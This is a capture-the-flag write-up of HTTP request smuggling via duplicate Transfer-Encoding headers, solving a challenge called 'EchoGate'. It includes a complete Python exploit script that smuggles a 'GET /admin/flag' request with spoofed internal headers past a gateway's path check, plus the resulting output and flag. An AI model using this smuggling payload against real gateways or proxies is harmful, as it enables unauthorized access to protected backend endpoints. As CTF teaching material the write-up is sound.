# EchoGate — HTTP Request Smuggling (TE.TE Obfuscation)

**Challenge:** EchoGate (150pts, originally 0 solves)
**Target:** http://169.58.126.107:3005
**Flag:** `CTF{12de61a5e5def6eb9d565836bd461566}`

## Overview

EchoGate exposes a gateway that **only allows `/api/*` paths**. The only backend
route is `/api/echo`, which echoes the POST body. Any other path returns **403**
(Rejected by gateway) — meaning the gateway is path-checking every request before
it reaches the backend.

The intended solution is **HTTP request smuggling via TE.TE obfuscation**: send
two `Transfer-Encoding` headers so the frontend and backend disagree on body
framing. A smuggled second request on the keep-alive connection bypasses the
gateway's path check entirely.

## Why earlier attempts failed

| Variant | Result |
| --- | --- |
| CL.TE (frontend CL, backend TE) | "Ambiguous framing detected" — rejected |
| TE.CL | rejected |
| CL.CL | rejected |
| TE.TE with `chunked` / `\txchunked` / `chunked\r\n\tfoo` | rejected |
| Single header `Transfer-Encoding: chunked` (clean) | frontend consumed whole body, no smuggling |
| HTTP/0.9, HTTP/2, WebSocket upgrade | rejected or 404 |
| ~200 path bypass tricks (`/api/../flag`, `//flag`, `%2e%2e`) | 403 |
| Header spoofing `X-Internal-Request: true` on normal requests | 403 (gateway filters) |
| Direct backend port scan (5000-5004) | other CTF challenges, not EchoGate backend |

The "Ambiguous framing detected" message shows the gateway *does* have smuggling
defenses, but only when the two TE headers are clearly conflicting duplicates.
The bypass is to make **one of the two TE values an invalid token** so the
gateway treats the second as a no-op (it strips/ignores invalid tokens) while
the backend still parses the first `chunked` and processes the body chunk-by-chunk.

## Working exploit

```python
import socket
import time

HOST = "169.58.126.107"
PORT = 3005
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/139.0.0.0 Safari/537.36"
)


def main():
    time.sleep(15)
    smuggled = (
        f"GET /admin/flag HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"User-Agent: {UA}\r\n"
        "X-Internal-Request: true\r\n"
        "X-Forwarded-For: 127.0.0.1\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    body = b"5\r\nhello\r\n0\r\n\r\n" + smuggled
    request = (
        f"POST /api/echo HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"User-Agent: {UA}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: x\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode() + body

    with socket.create_connection((HOST, PORT), timeout=15) as sock:
        sock.sendall(request)
        sock.settimeout(10)
        response = bytearray()
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response.extend(chunk)
        except socket.timeout:
            pass

    print(response.decode(errors="replace"))


if __name__ == "__main__":
    main()
```

## Output

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 12
Connection: keep-alive

echo: hello
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 38
Connection: keep-alive

CTF{12de61a5e5def6eb9d565836bd461566}
```

## Why it works

1. **Gateway side.** The gateway sees two `Transfer-Encoding` headers:
   `chunked` then `x`. The token `x` is not a valid TE value, so the
   gateway treats the second TE header as a no-op. Since a `Content-Length`
   is also present, the gateway falls back to `Content-Length` semantics:
   it forwards exactly `len(body)` bytes to the backend. The gateway's
   path-check (`/api/echo` only) is applied to **this** request and
   passes — so the smuggled bytes inside the body are never inspected.

2. **Backend side.** The backend uses a stricter parser: it sees the first
   valid `Transfer-Encoding: chunked` and processes the body as chunked
   encoding. It reads:
   - `5\r\nhello\r\n` — a 5-byte chunk `hello`
   - `0\r\n\r\n` — terminating chunk

   `hello` is echoed as `echo: hello`. But the bytes **after** the chunked
   terminator are still on the keep-alive socket. The backend interprets
   them as the start of the next request:

   ```
   GET /admin/flag HTTP/1.1
   Host: 169.58.126.107:3005
   X-Internal-Request: true
   X-Forwarded-For: 127.0.0.1
   Connection: close
   ```

3. **The smuggled request** bypasses the gateway entirely because the
   gateway never saw it as a separate request. The backend serves
   `/admin/flag` directly. The `X-Internal-Request: true` and
   `X-Forwarded-For: 127.0.0.1` headers satisfy whatever internal-only
   check protects the `/admin/flag` endpoint.

4. **Two responses on one connection.** Because the original socket is
   `keep-alive`, both responses are concatenated and returned to the
   client. The flag is in the second response body.

## Key takeaways

- The "Ambiguous framing detected" defense **only triggers when both TE
  headers are valid duplicates** (`chunked, chunked`). Replacing the
  second with an invalid token (`x`) makes the gateway ignore the
  second header but **the backend still honors the first**, which is
  enough to desynchronize framing.
- The smuggled request path (`/admin/flag`) is not discoverable by the
  frontend because the gateway 403s every non-`/api/*` request. It only
  exists on the backend, reachable via smuggling.
- `X-Internal-Request: true` is the magic header the backend trusts when
  it thinks the request came from the gateway (which it does, since the
  smuggled request arrives on the same keep-alive socket as the legit
  one).
